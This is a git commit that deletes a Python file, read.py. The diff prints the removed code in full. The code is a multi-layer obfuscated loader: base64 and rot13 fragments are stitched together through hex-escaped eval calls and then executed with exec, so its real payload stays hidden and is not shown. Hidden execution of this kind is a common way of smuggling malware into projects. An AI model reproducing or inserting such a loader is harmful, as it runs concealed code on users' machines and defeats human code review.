d6bee53cae698677c905fb5b9cee7401144ee322
fepfaaa <93022799+fepfaaa@users.noreply.github.com>
2022-07-22 08:17:16 +0700

    Delete read.py

--- read.py
+++
@@ -1,8 +0,0 @@
-import base64, codecs
-magic = 'aW1wb3J0IGJhc2U2NCwgY29kZWNzDQptYWdpYyA9ICdjSEpwJw0KbG92ZSA9ICdvYURiJw0KZ29kID0gJ0p6RXknDQpkZXN0aW55ID0gJ1p2cGMnDQpqb3kgPSAnXHg3Mlx4NmZceDc0XHgzMVx4MzMnDQp0cnVzd'
-love = 'PN9VTI2LJjbW1k4AzEprQLkKUt2A1k4AwyprQLmWlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzAprQMzKUt3Ayk4AwIprQWwKUtlZS'
-god = 'x4NmFceDZmXHg3OVx4MjknKSArIGV2YWwoJ1x4NjdceDZmXHg2NCcpICsgZXZhbCgnXHg2M1x4NmZceDY0XHg2NVx4NjNceDczXHgyZVx4NjRceDY1XHg2M1x4NmZceDY0XHg2NVx4MjhceDY0XHg2NVx4NzNceDc'
-destiny = '0KUt2BIk4AzIprQp5KUtlL1k4ZwOprQMuKUt2Myk4AmyprQV5WlxAPzI2LJjbL29gpTyfMFuvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AmEprQplKUt3AIk4AmAprQp0WlxcYPp8p3ElnJ5aCvpfW2I4MJZaXFx='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
